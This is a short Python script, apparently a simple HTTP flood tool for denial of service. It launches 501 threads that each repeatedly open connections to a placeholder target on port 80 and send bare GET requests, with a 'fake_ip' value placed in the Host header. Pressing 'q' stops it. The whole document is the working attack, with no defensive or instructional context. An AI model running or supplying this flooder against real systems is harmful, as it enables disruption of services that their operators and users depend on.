import socket
import threading
import keyboard, sys

target = "xx.xx.xx.xx"
fake_ip ="182.21.20.22"

port = 80

attack_num = 0

def attack():
    while True:
        if keyboard.is_pressed("q"):
            print('Program stopped!')
            break
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    
        global attack_num
        attack_num +=1
        print(attack_num)
        s.close()

for i in range(501):
    thread = threading.Thread(target=attack)
    print("Thread", i, "started!")
    thread.start()

